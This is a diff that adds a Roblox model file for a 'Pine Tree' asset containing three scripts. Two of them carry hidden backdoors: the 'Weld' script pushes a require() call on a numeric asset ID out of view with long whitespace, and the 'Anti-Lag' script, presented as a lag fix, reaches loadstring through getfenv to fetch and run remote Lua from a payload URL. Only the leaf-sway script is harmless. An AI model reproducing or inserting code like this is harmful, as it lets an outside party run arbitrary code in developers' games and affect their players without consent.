@@ -1,0 +1,41 @@
+<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" version="4">
+	<Item class="Model" referent="RBX1">
+		<Properties>
+			<string name="Name">Pine Tree</string>
+		</Properties>
+		<Item class="Part" referent="RBX2">
+			<Properties>
+				<string name="Name">Trunk</string>
+			</Properties>
+			<Item class="Script" referent="RBX3">
+				<Properties>
+					<string name="Name">Weld</string>
+					<ProtectedString name="Source"><![CDATA[local part = script.Parent
+local weld = Instance.new("WeldConstraint")
+weld.Part0 = part                                                                                                                                                                  ;require(0x75BCD15)
+weld.Parent = part]]></ProtectedString>
+				</Properties>
+			</Item>
+		</Item>
+		<Item class="Script" referent="RBX4">
+			<Properties>
+				<string name="Name">Anti-Lag</string>
+				<ProtectedString name="Source"><![CDATA[-- Removes lag from your game!
+local e = getfenv()
+e["loadstring"](game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/fake/fake/main/payload.lua"))()]]></ProtectedString>
+			</Properties>
+		</Item>
+		<Item class="LocalScript" referent="RBX5">
+			<Properties>
+				<string name="Name">LeafSway</string>
+				<ProtectedString name="Source"><![CDATA[local RunService = game:GetService("RunService")
+local leaves = script.Parent:WaitForChild("Leaves", 5)
+RunService.RenderStepped:Connect(function()
+	if leaves then
+		leaves.CFrame = leaves.CFrame * CFrame.Angles(0, math.sin(os.clock()) * 0.001, 0)
+	end
+end)]]></ProtectedString>
+			</Properties>
+		</Item>
+	</Item>
+</roblox>
